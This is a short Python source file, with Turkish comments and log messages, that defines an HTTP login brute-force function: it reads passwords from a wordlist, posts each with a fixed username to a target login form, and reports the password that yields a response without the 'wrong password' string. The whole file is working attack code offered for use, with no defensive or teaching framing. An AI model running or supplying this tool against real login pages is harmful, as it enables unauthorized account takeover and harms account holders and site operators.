import requests
from utils import log_success, log_fail

def http_bruteforce(url, username, wordlist_path):
    with open(wordlist_path, "r") as f:
        for password in f:
            password = password.strip()
            data = {"username": username, "password": password}
            response = requests.post(url, data=data)
            if "Hatalı" not in response.text:  # burayı form yapına göre değiştir
                log_success(f"[+] Giriş başarılı: {password}")
                return
            else:
                log_fail(f"[-] Hatalı parola: {password}")
